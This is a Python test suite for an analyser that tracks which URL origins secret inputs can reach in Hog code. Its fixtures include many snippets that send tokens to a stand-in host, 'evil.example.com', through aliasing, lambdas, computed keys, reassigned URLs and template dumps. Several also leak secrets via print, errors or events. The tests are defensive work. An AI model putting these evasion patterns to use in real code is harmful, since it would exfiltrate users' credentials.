import json
from pathlib import Path
from typing import Any

from django.test import SimpleTestCase

from parameterized import parameterized
from prometheus_client import REGISTRY

from products.cdp.backend.secret_origins import UNBOUND, SecretOrigins, secret_origins, url_origin

# The Node worker's tests read the same table, so the origin stored here and the origin the worker compares agree.
ORIGIN_CASES = json.loads(
    (Path(__file__).parents[2] / "shared" / "crosslang" / "secret_origin_cases.json").read_text(encoding="utf-8")
)

SENDS_TOKEN_TO_URL = "fetch(inputs.url, {'headers': {'Authorization': inputs.token}})"

WEBHOOK_HOG = """
let payload := {
  'headers': inputs.headers,
  'body': inputs.body,
  'method': inputs.method
}

if (not empty(inputs.signing_secret)) {
  payload['standard_webhooks'] := {
    'secret_input': 'signing_secret'
  }
}

if (not empty(inputs.secret_headers)) {
  payload['secret_headers_input'] := 'secret_headers'
}

let res := fetch(inputs.url, payload);

if (res.status >= 400) {
  throw Error(f'Webhook failed with status {res.status}: {res.body}');
}
"""


def _inputs(**values: Any) -> dict[str, dict[str, Any]]:
    return {key: {"value": value} for key, value in values.items()}


def _origins(*origins: str) -> frozenset[str]:
    return frozenset(origins)


class TestSecretHosts(SimpleTestCase):
    @parameterized.expand(
        [
            (
                "literal_url",
                "fetch('https://api.example.com/v1', {'headers': {'Authorization': inputs.token}})",
                _inputs(token="t"),
                {"token"},
                {"token": _origins("https://api.example.com")},
            ),
            (
                "url_input",
                SENDS_TOKEN_TO_URL,
                _inputs(url="https://hooks.example.com/a", token="t"),
                {"token"},
                {"token": _origins("https://hooks.example.com")},
            ),
            (
                "secret_url_input",
                "fetch(inputs.url, {'method': 'POST'})",
                _inputs(url="https://hooks.example.com/abc?key=1"),
                {"url"},
                {"url": _origins("https://hooks.example.com")},
            ),
            (
                "f_string_with_literal_host",
                "fetch(f'https://api.example.com/{event.properties.path}', {'body': inputs.token})",
                _inputs(token="t"),
                {"token"},
                {"token": _origins("https://api.example.com")},
            ),
            (
                "event_controls_the_host",
                SENDS_TOKEN_TO_URL,
                _inputs(url="https://{event.properties.host}/a", token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "host_not_terminated_before_an_unknown_part",
                "fetch(f'https://api.example.com{event.properties.path}', {'body': inputs.token})",
                _inputs(token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "nullish_fallback",
                "fetch(inputs.url ?? 'https://fallback.example.com', {'body': inputs.token})",
                _inputs(url="https://hooks.example.com/a", token="t"),
                {"token"},
                {"token": _origins("https://hooks.example.com", "https://fallback.example.com")},
            ),
            (
                "helper_function",
                """
                fun send(url, body) {
                  return fetch(url, {'body': body})
                }
                send('https://a.example.com', inputs.token)
                send('https://b.example.com', 'ping')
                """,
                _inputs(token="t"),
                {"token"},
                {"token": _origins("https://a.example.com", "https://b.example.com")},
            ),
            (
                "fetch_as_a_value",
                "let f := fetch\nf('https://hooks.example.com', {'body': inputs.token})",
                _inputs(token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "fetch_in_a_lambda_with_a_parameter_url",
                "let send := (u) -> fetch(u, {'body': inputs.token})\nsend('https://hooks.example.com')",
                _inputs(token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "named_lambda_throws_only_its_arguments",
                "let check := (value) -> { if (not value) { throw Error(f'Missing {value}') } }\n"
                f"check(inputs.url)\n{SENDS_TOKEN_TO_URL}",
                _inputs(url="https://hooks.example.com/a", token="t"),
                {"token"},
                {"token": _origins("https://hooks.example.com")},
            ),
            (
                "named_lambda_called_with_a_secret",
                "let send := (x) -> fetch('https://evil.example.com', {'body': x})\nsend(inputs.token)",
                _inputs(token="t"),
                {"token"},
                {"token": _origins("https://evil.example.com")},
            ),
            (
                "named_lambda_passed_as_a_value",
                "let send := (x) -> fetch('https://evil.example.com', {'body': x})\narrayMap(send, [inputs.token])",
                _inputs(token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "named_lambda_copied_to_another_name",
                "let send := (x) -> fetch('https://evil.example.com', {'body': x})\nlet other := send\n"
                "other(inputs.token)",
                _inputs(token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "lambda_passed_to_a_lambda_that_calls_it_with_a_secret",
                "let g := (cb) -> cb(inputs.token)\ng((x) -> fetch('https://evil.example.com', {'body': x}))",
                _inputs(token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "lambda_passed_to_a_function_that_calls_it_with_a_secret",
                "fun g(cb) { cb(inputs.token) }\ng((x) -> fetch('https://evil.example.com', {'body': x}))",
                _inputs(token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "function_passed_by_name_to_a_lambda",
                "fun send(x) { fetch('https://evil.example.com', {'body': x}) }\n"
                "let g := (cb) -> cb(inputs.token)\ng(send)",
                _inputs(token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "reduce_feeds_a_lambda_its_own_result",
                "arrayReduce((acc, x) -> { fetch('https://evil.example.com', {'body': acc})\nreturn inputs.token }, "
                "[1, 2], '')",
                _inputs(token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "webhook_template_resolves_secrets_by_key_name",
                WEBHOOK_HOG,
                {
                    **_inputs(url="https://hooks.example.com/a", method="POST", body={"event": "{event}"}),
                    **_inputs(signing_secret="whsec", secret_headers={"Authorization": "Bearer t"}),
                },
                {"signing_secret", "secret_headers"},
                {
                    "signing_secret": _origins("https://hooks.example.com"),
                    "secret_headers": _origins("https://hooks.example.com"),
                },
            ),
            (
                "two_secrets_to_two_origins",
                """
                fetch('https://a.example.com', {'headers': {'key': inputs.a_key}})
                fetch('https://b.example.com', {'headers': {'key': inputs.b_key}})
                """,
                _inputs(a_key="a", b_key="b"),
                {"a_key", "b_key"},
                {"a_key": _origins("https://a.example.com"), "b_key": _origins("https://b.example.com")},
            ),
            (
                "secret_used_outside_any_fetch",
                """
                if (sha256Hex(inputs.salt) == event.properties.signature) {
                  fetch('https://hooks.example.com', {'body': event.properties})
                }
                """,
                _inputs(salt="s"),
                {"salt"},
                {"salt": _origins()},
            ),
            (
                "secret_printed",
                f"print(base64Encode(inputs.token))\n{SENDS_TOKEN_TO_URL}",
                _inputs(url="https://hooks.example.com", token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "secret_captured_in_an_event",
                "postHogCapture({'event': 'leak', 'properties': {'value': inputs.token}})",
                _inputs(token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "secret_in_an_error",
                "throw Error(base64Encode(inputs.token))",
                _inputs(token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "print_called_through_another_name",
                "let log := print\nlog(inputs.token)",
                _inputs(token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "secret_returned_to_a_webhook_caller",
                "return {'httpResponse': {'status': 200, 'body': inputs.token}}",
                _inputs(token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "secret_written_into_the_event",
                "event.properties.salt := inputs.salt",
                _inputs(salt="s"),
                {"salt"},
                {"salt": UNBOUND},
            ),
            (
                "digest_of_a_secret_returned_in_the_event",
                "let e := event\ne.properties.id := sha256Hex(concat(e.properties.id, inputs.salt))\nreturn e",
                _inputs(salt="s"),
                {"salt"},
                {"salt": _origins()},
            ),
            (
                "secret_quoted_by_a_parse_error",
                "jsonParse(base64Encode(inputs.token))",
                _inputs(token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "secret_quoted_by_a_regex_error",
                "if (event.properties.name =~ inputs.token) { return event }",
                _inputs(token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "secret_passed_to_an_unknown_worker_function",
                "postHogNotYetWritten(inputs.token)",
                _inputs(token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "secret_passed_to_a_called_expression",
                "let d := {'log': print}\nd.log(inputs.token)",
                _inputs(token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "secret_quoted_by_an_input_template",
                "fetch('https://api.example.com', {'headers': {'Authorization': inputs.auth}})",
                _inputs(auth="{jsonParse(inputs.token)}", token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "response_forwarded_to_another_origin",
                f"let r := {SENDS_TOKEN_TO_URL}\nfetch('https://evil.example.com', {{'body': r.body}})",
                _inputs(url="https://hooks.example.com", token="t"),
                {"token"},
                {"token": _origins("https://hooks.example.com", "https://evil.example.com")},
            ),
            (
                "input_that_references_a_secret",
                "fetch('https://api.example.com', {'headers': {'Authorization': inputs.auth}})",
                _inputs(auth="Bearer {inputs.token}", token="t"),
                {"token"},
                {"token": _origins("https://api.example.com")},
            ),
            (
                "secret_copied_through_an_index_assignment",
                "let p := {}\np['h'] := inputs.token\nfetch(inputs.url, p)",
                _inputs(url="https://hooks.example.com", token="t"),
                {"token"},
                {"token": _origins("https://hooks.example.com")},
            ),
            (
                "options_from_event_data",
                "fetch('https://evil.example.com', jsonParse(event.properties.p))",
                _inputs(secret_headers={"Authorization": "Bearer t"}),
                {"secret_headers"},
                {"secret_headers": _origins("https://evil.example.com")},
            ),
            (
                "computed_option_key",
                "fetch('https://evil.example.com', {concat('secret_', 'headers_input'): concat('secret_', 'headers')})",
                _inputs(secret_headers={"Authorization": "Bearer t"}),
                {"secret_headers"},
                {"secret_headers": _origins("https://evil.example.com")},
            ),
            (
                "secret_assigned_into_a_dict_through_an_alias",
                "let h := {}\nlet a := h\na.Authorization := inputs.token\nfetch('https://evil.example.com', {'headers': h})",
                _inputs(token="t"),
                {"token"},
                {"token": _origins("https://evil.example.com")},
            ),
            (
                "secret_assigned_into_a_dict_through_a_parameter",
                """
                let h := {}
                fun put(d) { d.Authorization := inputs.token }
                put(h)
                fetch('https://evil.example.com', {'headers': h})
                """,
                _inputs(token="t"),
                {"token"},
                {"token": _origins("https://evil.example.com")},
            ),
            (
                "secret_assigned_into_a_nested_dict",
                """
                let inner := {}
                let p := {'headers': inner}
                p.headers.Authorization := inputs.token
                fetch('https://evil.example.com', {'headers': inner})
                """,
                _inputs(token="t"),
                {"token"},
                {"token": _origins("https://evil.example.com")},
            ),
            (
                "url_input_reassigned",
                f"inputs.url := 'https://evil.example.com'\n{SENDS_TOKEN_TO_URL}",
                _inputs(url="https://hooks.example.com", token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "url_input_reassigned_through_an_alias",
                f"let i := inputs\ni.url := 'https://evil.example.com'\n{SENDS_TOKEN_TO_URL}",
                _inputs(url="https://hooks.example.com", token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "secret_assigned_through_an_alias_and_printed",
                "let h := {}\nlet a := h\na.Authorization := inputs.token\nprint(h)",
                _inputs(token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "user_function_named_like_concat",
                "fun concat(a, b) { return 'https://evil.example.com/' }\n"
                "fetch(concat('https://hooks.example.com/', 'x'), {'headers': {'Authorization': inputs.token}})",
                _inputs(token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "lambda_named_like_coalesce",
                "let coalesce := (a, b) -> 'https://evil.example.com/'\n"
                "fetch(coalesce('https://hooks.example.com/a', 'https://hooks.example.com/b'), {'headers': {'Authorization': inputs.token}})",
                _inputs(token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "function_declared_twice",
                """
                fun send(url, secret) { fetch(url, {'headers': {'Authorization': secret}}) }
                fun unused() {
                  fun send(ignored, copy) { fetch('https://hooks.example.com', {'headers': {'Authorization': copy}}) }
                }
                send('https://evil.example.com', inputs.token)
                """,
                _inputs(token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "option_key_assigned_through_an_index",
                "let p := {}\nlet k := concat('secret_', 'headers_input')\np[k] := concat('secret_', 'headers')\n"
                "fetch('https://evil.example.com', p)",
                _inputs(secret_headers={"Authorization": "Bearer t"}),
                {"secret_headers"},
                {"secret_headers": _origins("https://evil.example.com")},
            ),
            (
                "by_name_option_with_a_computed_name",
                "fetch('https://evil.example.com', {'secret_headers_input': concat('secret_', 'headers')})",
                _inputs(secret_headers={"Authorization": "Bearer t"}),
                {"secret_headers"},
                {"secret_headers": _origins("https://evil.example.com")},
            ),
            (
                "fetch_without_arguments",
                "fetch()",
                _inputs(token="t"),
                {"token"},
                {"token": _origins()},
            ),
            (
                "fetch_without_arguments_after_an_aliased_write",
                "let h := {}\nlet a := h\na.x := inputs.token\nfetch()",
                _inputs(token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "fetch_to_a_url_from_event_data",
                "fetch(event.properties.url, {'body': inputs.token})\nfetch(event.properties.url)",
                _inputs(token="t", salt="s"),
                {"token", "salt"},
                {"token": UNBOUND, "salt": _origins()},
            ),
            (
                "liquid_input_that_dumps_every_input",
                "fetch(inputs.url, {'method': 'POST'})",
                {"url": {"value": "https://evil.example.com/{{ inputs | json }}", "templating": "liquid"}},
                {"api_key"},
                {"api_key": _origins("https://evil.example.com")},
            ),
            (
                "input_that_indexes_a_secret",
                "fetch(inputs.url, {'method': 'POST'})",
                _inputs(url="https://hooks.example.com/{inputs['token']}", token="t"),
                {"token"},
                {"token": _origins("https://hooks.example.com")},
            ),
            (
                "unparseable_code",
                "fetch(inputs.url, {",
                _inputs(url="https://hooks.example.com", token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
        ]
    )
    def test_secret_origins(
        self, _name: str, hog: str, inputs: dict, secret_keys: set[str], expected: dict[str, SecretOrigins]
    ) -> None:
        assert secret_origins(hog, inputs, [], secret_keys) == expected

    def test_code_too_costly_to_analyze_leaves_its_secrets_unbound(self) -> None:
        hog = "\n".join(f"let v{index} := concat(inputs.token, 'a', 'b', 'c')" for index in range(3000))
        labels = {"reason": "budget"}
        before = REGISTRY.get_sample_value("posthog_cdp_secret_origins_unanalyzable_total", labels) or 0

        assert secret_origins(hog, _inputs(token="t"), [], {"token"}) == {"token": UNBOUND}
        assert REGISTRY.get_sample_value("posthog_cdp_secret_origins_unanalyzable_total", labels) == before + 1

    def test_mapping_inputs_add_their_origins(self) -> None:
        mapping_inputs = [_inputs(url="https://mapped.example.com/a")]

        origins = secret_origins(
            SENDS_TOKEN_TO_URL, _inputs(url="https://hooks.example.com", token="t"), mapping_inputs, {"token"}
        )

        assert origins == {"token": _origins("https://hooks.example.com", "https://mapped.example.com")}

    @parameterized.expand(
        [
            ("https://API.Example.COM./a", _origins("https://api.example.com")),
            # The input is a hog template, which reads the doubled backslash as one literal backslash.
            (r"https://evil.example.com\\@good.example.com/a", UNBOUND),
        ]
    )
    def test_origin_of_a_literal_url(self, url: str, expected: SecretOrigins) -> None:
        assert secret_origins(SENDS_TOKEN_TO_URL, _inputs(url=url, token="t"), [], {"token"}) == {"token": expected}

    @parameterized.expand([(case["url"], case["origin"]) for case in ORIGIN_CASES])
    def test_url_origin_matches_the_worker(self, url: str, origin: str | None) -> None:
        assert url_origin(url, complete=True) == origin
